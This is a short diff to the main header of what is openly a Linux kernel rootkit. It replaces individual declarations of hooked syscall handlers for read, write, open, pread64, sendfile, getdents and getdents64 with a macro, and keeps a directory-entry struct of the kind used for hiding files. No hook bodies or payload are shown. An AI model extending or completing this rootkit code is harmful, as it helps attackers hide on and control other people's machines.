@@ -1,8 +1,10 @@
 #ifndef _ROOTKIT_ROOTKIT_MAIN_H_
 #define _ROOTKIT_ROOTKIT_MAIN_H_
 
-#include <asm/ptrace.h>
-#include <linux/linkage.h>
+#include "macro-utils.h"
+
+
+#define HOOK_HANDLER_NAME(_syscall_name) _new_##_syscall_name##_handler
 
 struct linux_dirent {
     unsigned long d_ino;
@@ -11,12 +13,6 @@ struct linux_dirent {
     char d_name[];
 };
 
-asmlinkage long new_read(struct pt_regs *p_regs);
-asmlinkage long new_write(struct pt_regs *p_regs);
-asmlinkage long new_open(struct pt_regs *p_regs);
-asmlinkage long new_pread64(struct pt_regs *p_regs);
-asmlinkage long new_sendfile(struct pt_regs *p_regs);
-asmlinkage long new_getdents(struct pt_regs *p_regs);
-asmlinkage long new_getdents64(struct pt_regs *p_regs);
+DECLARE_HOOK_HANDLERS(read, write, open, pread64, sendfile, getdents, getdents64)
 
 #endif
